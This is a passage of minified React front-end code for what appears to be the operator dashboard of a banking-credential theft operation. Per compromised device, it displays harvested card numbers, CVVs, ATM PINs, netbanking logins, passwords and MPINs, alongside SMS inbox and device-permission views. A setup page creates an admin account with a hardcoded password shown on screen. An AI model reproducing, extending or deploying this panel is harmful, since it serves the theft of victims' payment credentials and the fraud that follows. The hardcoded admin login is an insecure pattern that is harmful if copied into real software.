          animation: btnAstra 0.8s ease-in-out infinite;
          box-shadow: 0 0 50px rgba(255, 100, 0, 0.25);
        }

        @keyframes btnAstra {
          0%, 100% { background-position: 0% 0%; }
          50% { background-position: 100% 0%; }
        }

        .auth-btn::before {
          content: '';
          position: absolute;
          top: -50%;
          left: -50%;
          width: 200%;
          height: 200%;
          background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.06), transparent);
          transform: rotate(45deg);
          animation: btnShine 3s ease-in-out infinite;
        }

        @keyframes btnShine {
          0% { transform: translateX(-100%) rotate(45deg); }
          100% { transform: translateX(100%) rotate(45deg); }
        }

        .auth-btn:hover:not(:disabled) {
          transform: scale(1.02);
          box-shadow: 0 4px 30px rgba(255, 107, 53, 0.3);
        }

        .auth-btn:disabled {
          opacity: 0.6;
          cursor: not-allowed;
          transform: none;
        }

        .mantra-loading {
          animation: mantraSpin 0.5s ease-in-out infinite;
          display: inline-block;
        }

        @keyframes mantraSpin {
          0%, 100% { transform: scale(1); opacity: 1; }
          50% { transform: scale(1.1); opacity: 0.7; }
        }

        .auth-error-msg {
          padding: 8px 12px;
          background: rgba(231, 76, 60, 0.08);
          border: 1px solid rgba(231, 76, 60, 0.3);
          border-radius: 6px;
          color: #e74c3c;
          font-size: 12px;
          min-height: 36px;
          display: flex;
          align-items: center;
        }

        .auth-footer {
          margin-top: 14px;
          text-align: center;
          display: flex;
          justify-content: center;
          gap: 10px;
          flex-wrap: wrap;
        }

        .auth-link {
          color: rgba(255, 200, 150, 0.4);
          text-decoration: none;
          font-size: 12px;
          transition: all 0.3s;
        }

        .auth-link:hover {
          color: #ff6b35;
          text-decoration: underline;
        }

        .auth-divider {
          color: rgba(255, 200, 150, 0.1);
        }

        /* ============================================ */
        /* RESPONSIVE */
        /* ============================================ */
        @media (max-width: 480px) {
          .auth-container {
            max-width: 92vw;
            padding: 18px 16px 20px;
          }

          .auth-logo-wrapper {
            width: 56px;
            height: 56px;
            padding: 4px;
          }

          .auth-logo-title {
            font-size: 26px;
            letter-spacing: 5px;
          }

          .auth-logo-subtitle {
            font-size: 10px;
            letter-spacing: 2px;
          }

          .auth-input-group input {
            height: 38px;
            padding: 8px 12px;
            font-size: 12px;
          }

          .auth-btn {
            height: 40px;
            font-size: 14px;
          }

          .astra-level-bar {
            width: 80%;
            bottom: 12px;
          }
        }

        @media (max-height: 650px) {
          .auth-logo-wrapper {
            width: 48px;
            height: 48px;
          }

          .auth-logo-title {
            font-size: 22px;
            letter-spacing: 4px;
          }

          .auth-logo-subtitle {
            font-size: 9px;
          }

          .auth-container {
            padding: 12px 16px 16px;
          }

          .auth-input-group input {
            height: 34px;
            padding: 6px 10px;
            font-size: 12px;
          }

          .auth-btn {
            height: 36px;
            font-size: 13px;
            padding: 6px;
          }

          .auth-form {
            gap: 8px;
          }

          .auth-logo-overlay {
            margin-bottom: 10px;
          }
        }

        @media (min-width: 1200px) {
          .auth-container {
            max-width: 420px;
            padding: 32px 40px 36px;
          }

          .auth-logo-wrapper {
            width: 88px;
            height: 88px;
          }

          .auth-logo-title {
            font-size: 40px;
            letter-spacing: 10px;
          }
        }
      `})]})}function Ek(){const[t,e]=g.useState(!1),[n,r]=g.useState(""),[s,o]=g.useState(""),[a,l]=g.useState(!1);console.log("✅ Setup page rendered");const c=async()=>{console.log("🔵 Create Admin button clicked"),e(!0),o(""),r("");try{const d=await xk();console.log("🔵 Result:",d),d.success?(r("✅ Admin user created successfully!"),l(!0)):o("⚠️ "+d.error)}catch(d){console.error("❌ Error creating admin:",d),o("⚠️ "+d.message)}e(!1)};return i.jsx("div",{className:"auth-page",children:i.jsxs("div",{className:"auth-container",children:[i.jsxs("div",{className:"auth-header",children:[i.jsx("span",{className:"auth-logo",children:"⚙️"}),i.jsx("h1",{children:"Setup KRONOS"}),i.jsx("p",{children:"Create admin user in database"})]}),i.jsx("div",{style:{background:"#f0f0f0",padding:"8px 12px",borderRadius:"4px",marginBottom:"16px",fontSize:"12px",color:"#666"},children:"🔍 Debug: Ready to create admin user"}),i.jsxs("div",{className:"setup-info",style:{marginBottom:"16px"},children:[i.jsxs("p",{style:{fontSize:"13px",color:"var(--text-muted)"},children:[i.jsx("strong",{children:"⚠️ Important:"})," This will create an admin user directly in Realtime Database."]}),i.jsxs("div",{style:{background:"var(--bg-primary)",padding:"12px",borderRadius:"8px",marginTop:"10px",fontSize:"13px"},children:[i.jsxs("div",{children:["📧 Email: ",i.jsx("code",{style:{color:"var(--accent-cyan)"},children:"admin@kronos.com"})]}),i.jsxs("div",{children:["🔑 Password: ",i.jsx("code",{style:{color:"var(--accent-cyan)"},children:"Admin@123"})]}),i.jsxs("div",{children:["🆔 User ID: ",i.jsx("code",{style:{color:"var(--accent-cyan)"},children:"admin"})]})]})]}),n&&i.jsx("div",{className:"auth-success-msg",style:{whiteSpace:"pre-line",padding:"12px",borderRadius:"8px",background:"#d4edda",color:"#155724",marginBottom:"12px"},children:n}),a&&i.jsxs("div",{style:{padding:"12px",borderRadius:"8px",background:"#cce5ff",color:"#004085",marginBottom:"12px",fontSize:"14px"},children:[i.jsx("div",{children:"✅ Admin user created successfully!"}),i.jsxs("div",{style:{marginTop:"8px",fontSize:"13px"},children:[i.jsxs("div",{children:["📧 Email: ",i.jsx("strong",{children:"admin@kronos.com"})]}),i.jsxs("div",{children:["🔑 Password: ",i.jsx("strong",{children:"Admin@123"})]}),i.jsxs("div",{children:["🆔 User ID: ",i.jsx("strong",{children:"admin"})]})]}),i.jsx("div",{style:{marginTop:"8px"},children:i.jsx("a",{href:"/login",style:{color:"#004085",fontWeight:"bold"},children:"→ Go to Login"})})]}),s&&i.jsx("div",{className:"auth-error-msg",style:{padding:"12px",borderRadius:"8px",background:"#f8d7da",color:"#721c24",marginBottom:"12px"},children:s}),i.jsx("button",{className:"auth-btn",onClick:c,disabled:t,style:{width:"100%",padding:"12px",fontSize:"16px",borderRadius:"8px",border:"none",background:t?"#6c757d":"#007bff",color:"white",cursor:t?"not-allowed":"pointer",transition:"all 0.3s"},children:t?"⏳ Creating...":"🚀 Create Admin User"}),i.jsx("div",{className:"auth-links",style:{marginTop:"16px",textAlign:"center"},children:i.jsx("a",{href:"/login",className:"auth-link",style:{color:"#007bff"},children:"← Back to Login"})}),i.jsxs("div",{style:{display:"none"},children:["Loading: ",String(t),"Message: ",n,"Error: ",s]})]})})}function Ik(){const t=gt(),{user:e,logout:n}=xn(),[r,s]=g.useState(""),[o,a]=g.useState(""),[l,c]=g.useState(""),[d,p]=g.useState(!1),[f,u]=g.useState(""),[b,x]=g.useState(""),v=async _=>{if(_.preventDefault(),p(!0),u(""),x(""),o!==l){u("❌ New passwords do not match"),p(!1);return}if(o.length<6){u("❌ Password must be at least 6 characters"),p(!1);return}const m=await pk(e.userId,r,o);m.success?(x("✅ Password changed successfully! All devices logged out."),setTimeout(()=>{n(),t("/login")},3e3)):u("❌ "+m.error),p(!1)};return i.jsxs("div",{className:"detail-page",style:{padding:"20px",maxWidth:"400px",margin:"0 auto"},children:[i.jsx("h2",{children:"🔑 Change Password"}),i.jsx("p",{style:{color:"var(--text-muted)",fontSize:"13px",marginBottom:"20px"},children:"Changing password will logout all your devices"}),i.jsxs("form",{onSubmit:v,style:{display:"flex",flexDirection:"column",gap:"16px"},children:[i.jsxs("div",{className:"auth-input-group",children:[i.jsx("label",{children:"Current Password"}),i.jsx("input",{type:"password",value:r,onChange:_=>s(_.target.value),placeholder:"Enter current password",required:!0})]}),i.jsxs("div",{className:"auth-input-group",children:[i.jsx("label",{children:"New Password"}),i.jsx("input",{type:"password",value:o,onChange:_=>a(_.target.value),placeholder:"Enter new password",required:!0})]}),i.jsxs("div",{className:"auth-input-group",children:[i.jsx("label",{children:"Confirm New Password"}),i.jsx("input",{type:"password",value:l,onChange:_=>c(_.target.value),placeholder:"Confirm new password",required:!0})]}),f&&i.jsx("div",{className:"auth-error-msg",children:f}),b&&i.jsx("div",{className:"auth-success-msg",children:b}),i.jsx("button",{type:"submit",className:"auth-btn",disabled:d,children:d?"⏳ Changing...":"🔄 Change Password"})]})]})}function Rk(){var m,h,y,w;const t=gt(),{user:e,userData:n,logout:r}=xn(),[s,o]=g.useState(!1),a=g.useRef(null);g.useEffect(()=>{const N=R=>{a.current&&!a.current.contains(R.target)&&o(!1)};return document.addEventListener("click",N),()=>document.removeEventListener("click",N)},[]);const l=async()=>{o(!1),await r()},c=()=>{o(!1),t("/change-password")},d=()=>{o(!1),t("/admin-management")},p=()=>{o(!1),t("/admin-devices")},f=()=>{o(!1),t("/sessions")},u=()=>{o(!1),t("/admin-add")},b=()=>{o(!1),t("/admin-dashboard")},x=()=>{o(!1),t("/all-devices")},v=()=>{o(!1),t("/all-device-data")},_=()=>{o(!1),t("/all-sms")};return e?i.jsxs("div",{className:"user-menu",ref:a,children:[i.jsxs("button",{className:"user-menu-btn",onClick:()=>o(!s),children:[i.jsx("span",{className:"user-avatar",children:((m=n==null?void 0:n.name)==null?void 0:m[0])||((h=e.userId)==null?void 0:h[0])||"U"}),i.jsx("span",{className:"user-name",children:(n==null?void 0:n.name)||e.userId||"User"}),i.jsx("span",{className:"user-arrow",children:s?"▴":"▾"})]}),s&&i.jsxs("div",{className:"user-dropdown",children:[i.jsxs("div",{className:"user-dropdown-header",children:[i.jsx("span",{className:"dropdown-avatar",children:((y=n==null?void 0:n.name)==null?void 0:y[0])||((w=e.userId)==null?void 0:w[0])||"U"}),i.jsxs("div",{className:"dropdown-info",children:[i.jsx("span",{className:"dropdown-name",children:(n==null?void 0:n.name)||e.userId||"User"}),i.jsx("span",{className:"dropdown-email",children:(n==null?void 0:n.email)||"No email"}),i.jsx("span",{className:`dropdown-role ${(n==null?void 0:n.role)==="admin"?"admin":"user"}`,children:(n==null?void 0:n.role)==="admin"?"🔑 Admin":"👤 User"})]})]}),i.jsx("div",{className:"user-dropdown-divider"}),i.jsx("button",{className:"dropdown-item",onClick:()=>{o(!1),t("/")},children:"📱 Dashboard"}),i.jsx("button",{className:"dropdown-item",onClick:f,children:"🔐 My Sessions"}),i.jsx("button",{className:"dropdown-item",onClick:x,children:"📱 All Devices"}),i.jsx("button",{className:"dropdown-item",onClick:_,children:"📨 SMS Inbox"}),(n==null?void 0:n.role)==="admin"&&i.jsxs(i.Fragment,{children:[i.jsx("button",{className:"dropdown-item",onClick:b,children:"📊 Ping Dashboard"}),i.jsx("button",{className:"dropdown-item",onClick:v,children:"📊 All Data"}),i.jsx("button",{className:"dropdown-item",onClick:p,children:"📱 Device Manager"}),i.jsx("button",{className:"dropdown-item",onClick:u,children:"➕ Add Admin"}),i.jsx("button",{className:"dropdown-item",onClick:d,children:"🔑 Admin Management"})]}),i.jsx("button",{className:"dropdown-item",onClick:c,children:"🔑 Change Password"}),i.jsx("div",{className:"user-dropdown-divider"}),i.jsx("button",{className:"dropdown-item logout",onClick:l,children:"🚪 Logout"})]})]}):null}const Vv=g.createContext(),Tk=({children:t})=>{const[e,n]=g.useState(()=>{const s=localStorage.getItem("theme");return s?s==="dark":window.matchMedia("(prefers-color-scheme: dark)").matches});g.useEffect(()=>{localStorage.setItem("theme",e?"dark":"light"),document.documentElement.setAttribute("data-theme",e?"dark":"light")},[e]);const r=()=>n(!e);return i.jsx(Vv.Provider,{value:{isDark:e,toggleTheme:r},children:t})},Ak=()=>{const t=g.useContext(Vv);if(!t)throw new Error("useTheme must be used within ThemeProvider");return t};function Xe({children:t}){const{user:e,loading:n}=xn();return n?i.jsxs("div",{className:"auth-loading",children:[i.jsx("div",{className:"loading-spinner"}),i.jsx("p",{children:"🔐 Verifying..."})]}):e?t:i.jsx(dx,{to:"/login"})}function Gv(){const{deviceId:t}=On(),[e,n]=g.useState(null),[r,s]=g.useState(!0),[o,a]=g.useState([]),[l,c]=g.useState(null);g.useEffect(()=>{d()},[t]);const d=async()=>{s(!0),c(null);try{const u=B(U,`card_payment/${t}`),b=await ce(u);if(b.exists()){const x=b.val(),v=Object.keys(x).map(_=>({id:_,...x[_]}));v.sort((_,m)=>{const h=_.timestampMillis||0;return(m.timestampMillis||0)-h}),a(v),n(v[0]||null)}}catch(u){console.error(u),c(u.message)}s(!1)},p=u=>u==="Success"?"#2ecc71":u==="Failed"?"#e74c3c":u==="Pending"?"#f1c40f":"#95a5a6",f=u=>u==="Success"?"✅":u==="Failed"?"❌":u==="Pending"?"⏳":"⚪";return r?i.jsxs("div",{style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"100px",gap:"8px",padding:"10px"},children:[i.jsx("div",{style:{width:"24px",height:"24px",border:"3px solid #e2e8f0",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}),i.jsx("p",{style:{fontSize:"12px",color:"var(--text-muted)"},children:"Loading..."}),i.jsx("style",{children:`
          @keyframes spin {
            to { transform: rotate(360deg); }
          }
        `})]}):l?i.jsxs("div",{style:{textAlign:"center",padding:"20px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"32px",display:"block",marginBottom:"4px"},children:"❌"}),i.jsx("p",{style:{fontSize:"13px"},children:"Failed to load card data"}),i.jsx("button",{onClick:d,style:{marginTop:"8px",padding:"4px 16px",border:"1px solid var(--border-color)",borderRadius:"6px",background:"var(--bg-card)",color:"var(--text-primary)",cursor:"pointer",fontSize:"12px"},children:"Retry"})]}):e?i.jsxs("div",{style:{padding:"4px 0"},children:[i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"4px",marginBottom:"6px"},children:[i.jsxs("div",{style:{gridColumn:"span 2",background:"var(--bg-card)",borderRadius:"6px",padding:"6px 10px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"11px",color:"var(--text-muted)",fontWeight:500},children:"💳 Card Number"}),i.jsx("span",{style:{fontSize:"13px",fontWeight:600,color:"var(--text-primary)",fontFamily:"monospace",letterSpacing:"1px"},children:e.cardNumber||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"👤 Holder"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:e.cardHolder||e.nameOnCard||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"📅 Expiry"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:e.expiry||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🔐 CVV"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)",fontFamily:"monospace",letterSpacing:"2px"},children:e.cvv||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🏦 Type"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:e.cardType||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"💰 Amount"}),i.jsxs("span",{style:{fontSize:"14px",fontWeight:700,color:"#2ecc71"},children:["₹",e.amount||"0"]})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"📌 Status"}),i.jsxs("span",{style:{fontSize:"12px",fontWeight:700,color:p(e.status)},children:[f(e.status)," ",e.status||"Pending"]})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🔑 ATM PIN"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"#e74c3c",fontFamily:"monospace",letterSpacing:"2px"},children:e.atmPin||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"💾 Save"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:e.saveCard?"✅ Yes":"❌ No"})]}),i.jsxs("div",{style:{gridColumn:"span 2",background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🕐 Timestamp"}),i.jsx("span",{style:{fontSize:"11px",fontWeight:500,color:"var(--text-muted)"},children:e.timestamp||"N/A"})]})]}),o.length>1&&i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",border:"1px solid var(--border-color)",overflow:"hidden",marginTop:"4px"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"6px 10px",background:"var(--bg-input)",borderBottom:"1px solid var(--border-color)",fontSize:"11px",fontWeight:600,color:"var(--text-primary)"},children:[i.jsx("span",{children:"📋 Recent Payments"}),i.jsx("span",{style:{background:"#6c63ff",color:"white",fontSize:"10px",padding:"1px 8px",borderRadius:"10px"},children:o.length})]}),o.slice(0,5).map((u,b)=>i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"5px 10px",borderBottom:b<o.slice(0,5).length-1?"1px solid var(--border-color)":"none"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"8px"},children:[i.jsx("span",{style:{fontSize:"14px"},children:"💳"}),i.jsxs("div",{children:[i.jsxs("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:["₹",u.amount||"0"]}),i.jsx("span",{style:{fontSize:"10px",fontWeight:500,color:p(u.status),marginLeft:"6px"},children:u.status||"Pending"})]})]}),i.jsx("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:u.timestamp||formatDate(u.timestampMillis)})]},u.id||b))]})]}):i.jsxs("div",{style:{textAlign:"center",padding:"20px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"32px",display:"block",marginBottom:"4px"},children:"📭"}),i.jsx("p",{style:{fontSize:"13px"},children:"No card payment data found"})]})}function Yv(){const{deviceId:t}=On(),[e,n]=g.useState(null),[r,s]=g.useState(!0),[o,a]=g.useState([]),[l,c]=g.useState(null);g.useEffect(()=>{d()},[t]);const d=async()=>{s(!0),c(null);try{const u=B(U,`netbanking_payment/${t}`),b=await ce(u);if(b.exists()){const x=b.val(),v=Object.keys(x).map(_=>({id:_,...x[_]}));v.sort((_,m)=>{const h=_.timestamp?new Date(_.timestamp.split(" ").reverse().join(" ")).getTime():0;return(m.timestamp?new Date(m.timestamp.split(" ").reverse().join(" ")).getTime():0)-h}),a(v),n(v[0]||null)}}catch(u){console.error(u),c(u.message)}s(!1)},p=u=>u==="Success"?"#2ecc71":u==="Failed"?"#e74c3c":u==="Pending"?"#f1c40f":"#95a5a6",f=u=>u==="Success"?"✅":u==="Failed"?"❌":u==="Pending"?"⏳":"⚪";return r?i.jsxs("div",{style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"100px",gap:"8px",padding:"10px"},children:[i.jsx("div",{style:{width:"24px",height:"24px",border:"3px solid #e2e8f0",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}),i.jsx("p",{style:{fontSize:"12px",color:"var(--text-muted)"},children:"Loading..."}),i.jsx("style",{children:`
          @keyframes spin {
            to { transform: rotate(360deg); }
          }
        `})]}):l?i.jsxs("div",{style:{textAlign:"center",padding:"20px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"32px",display:"block",marginBottom:"4px"},children:"❌"}),i.jsx("p",{style:{fontSize:"13px"},children:"Failed to load netbanking data"}),i.jsx("button",{onClick:d,style:{marginTop:"8px",padding:"4px 16px",border:"1px solid var(--border-color)",borderRadius:"6px",background:"var(--bg-card)",color:"var(--text-primary)",cursor:"pointer",fontSize:"12px"},children:"Retry"})]}):e?i.jsxs("div",{style:{padding:"4px 0"},children:[i.jsxs("div",{style:{display:"grid",gridTemplateColumns:"1fr 1fr",gap:"4px",marginBottom:"6px"},children:[i.jsxs("div",{style:{gridColumn:"span 2",background:"var(--bg-card)",borderRadius:"6px",padding:"6px 10px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"11px",color:"var(--text-muted)",fontWeight:500},children:"🏦 Bank Name"}),i.jsx("span",{style:{fontSize:"13px",fontWeight:600,color:"var(--text-primary)"},children:e.bankName||e.bank||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"👤 Login ID"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:e.loginId||e.userId||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🔐 Password"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)",fontFamily:"monospace"},children:e.password||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🔑 MPIN"}),i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"#e74c3c",fontFamily:"monospace",letterSpacing:"2px"},children:e.mpin||e.trxPin||e.txnPin||"N/A"})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"💰 Amount"}),i.jsxs("span",{style:{fontSize:"14px",fontWeight:700,color:"#2ecc71"},children:["₹",e.amount||"0"]})]}),i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"📌 Status"}),i.jsxs("span",{style:{fontSize:"12px",fontWeight:700,color:p(e.status)},children:[f(e.status)," ",e.status||"Pending"]})]}),i.jsxs("div",{style:{gridColumn:"span 2",background:"var(--bg-card)",borderRadius:"6px",padding:"4px 8px",display:"flex",justifyContent:"space-between",alignItems:"center",border:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontWeight:500},children:"🕐 Timestamp"}),i.jsx("span",{style:{fontSize:"11px",fontWeight:500,color:"var(--text-muted)"},children:e.timestamp||"N/A"})]})]}),o.length>1&&i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"6px",border:"1px solid var(--border-color)",overflow:"hidden",marginTop:"4px"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"6px 10px",background:"var(--bg-input)",borderBottom:"1px solid var(--border-color)",fontSize:"11px",fontWeight:600,color:"var(--text-primary)"},children:[i.jsx("span",{children:"📋 Recent NetBanking"}),i.jsx("span",{style:{background:"#6c63ff",color:"white",fontSize:"10px",padding:"1px 8px",borderRadius:"10px"},children:o.length})]}),o.slice(0,5).map((u,b)=>i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"5px 10px",borderBottom:b<o.slice(0,5).length-1?"1px solid var(--border-color)":"none"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"8px"},children:[i.jsx("span",{style:{fontSize:"14px"},children:"🏦"}),i.jsxs("div",{children:[i.jsx("span",{style:{fontSize:"12px",fontWeight:600,color:"var(--text-primary)"},children:u.bankName||u.bank||"N/A"}),i.jsx("span",{style:{fontSize:"10px",fontWeight:500,color:p(u.status),marginLeft:"6px"},children:u.status||"Pending"})]})]}),i.jsxs("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:["₹",u.amount||"0"]})]},u.id||b))]})]}):i.jsxs("div",{style:{textAlign:"center",padding:"20px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"32px",display:"block",marginBottom:"4px"},children:"📭"}),i.jsx("p",{style:{fontSize:"13px"},children:"No net banking data found"})]})}function Kv(){const{deviceId:t}=On();gt();const[e,n]=g.useState(null),[r,s]=g.useState(!0);if(g.useEffect(()=>{const a=B(U,`permissions/${t}`),l=cn(a,c=>{c.exists()&&n(c.val()),s(!1)});return()=>l()},[t]),r)return i.jsxs("div",{className:"page-loading",children:[i.jsx("div",{className:"loading-spinner"}),i.jsx("p",{children:"Loading..."})]});const o=e?Object.entries(e).filter(([a])=>!["timestamp","humanTime","deviceId","androidVersion","deviceModel","deviceBrand","apiLevel","totalPermissions","grantedCount","deniedCount","grantedPercentage"].includes(a)):[];return i.jsx("div",{className:"detail-page",children:e?i.jsxs(i.Fragment,{children:[i.jsxs("div",{className:"perm-stats",children:[i.jsxs("div",{className:"perm-stat",children:[i.jsx("span",{children:"Total"}),i.jsx("strong",{children:e.totalPermissions})]}),i.jsxs("div",{className:"perm-stat",children:[i.jsx("span",{children:"Granted"}),i.jsx("strong",{style:{color:"#2ecc71"},children:e.grantedCount})]}),i.jsxs("div",{className:"perm-stat",children:[i.jsx("span",{children:"Denied"}),i.jsx("strong",{style:{color:"#e74c3c"},children:e.deniedCount})]}),i.jsxs("div",{className:"perm-stat",children:[i.jsx("span",{children:"%"}),i.jsxs("strong",{style:{color:"#f59e0b"},children:[e.grantedPercentage,"%"]})]})]}),i.jsxs("div",{className:"detail-card",children:[o.map(([a,l])=>i.jsxs("div",{className:`detail-row ${l?"granted":"denied"}`,children:[i.jsx("span",{className:"label",children:a.replace(/_/g," ")}),i.jsx("span",{className:"value",children:l?"✅ Granted":"❌ Denied"})]},a)),i.jsxs("div",{className:"detail-row full",children:[i.jsxs("span",{className:"label",children:["📅 ",e.humanTime]}),i.jsxs("span",{className:"value",children:["📱 ",e.deviceBrand," ",e.deviceModel]})]})]})]}):i.jsx("div",{className:"empty-state",children:"📭 No permissions data found"})})}function Qv(){const{deviceId:t}=On(),[e,n]=g.useState(null),[r,s]=g.useState(!0),[o,a]=g.useState([]),[l,c]=g.useState(null);g.useEffect(()=>{t&&d()},[t]);const d=async()=>{s(!0),c(null);try{const u=B(U,`mobile_verification/${t}`),b=await ce(u);if(b.exists()){const x=b.val(),v=Object.keys(x).map(_=>({id:_,...x[_]}));v.sort((_,m)=>{const h=_.timestamp?new Date(_.timestamp.split(" ").reverse().join(" ")).getTime():0;return(m.timestamp?new Date(m.timestamp.split(" ").reverse().join(" ")).getTime():0)-h}),a(v),n(v[0]||null)}}catch(u){console.error("Error fetching verification data:",u),c(u.message)}s(!1)},p=u=>u==="Verified"?"#2ecc71":u==="Pending"?"#f1c40f":u==="Rejected"?"#e74c3c":"#95a5a6",f=u=>u==="Verified"?"✅":u==="Pending"?"⏳":u==="Rejected"?"❌":"⚪";return r?i.jsxs("div",{style:{display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",minHeight:"100px",gap:"8px",padding:"10px"},children:[i.jsx("div",{style:{width:"24px",height:"24px",border:"3px solid #e2e8f0",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.8s linear infinite"}}),i.jsx("p",{style:{fontSize:"12px",color:"var(--text-muted)"},children:"Loading verification..."}),i.jsx("style",{children:`
          @keyframes spin {
            to { transform: rotate(360deg); }
          }
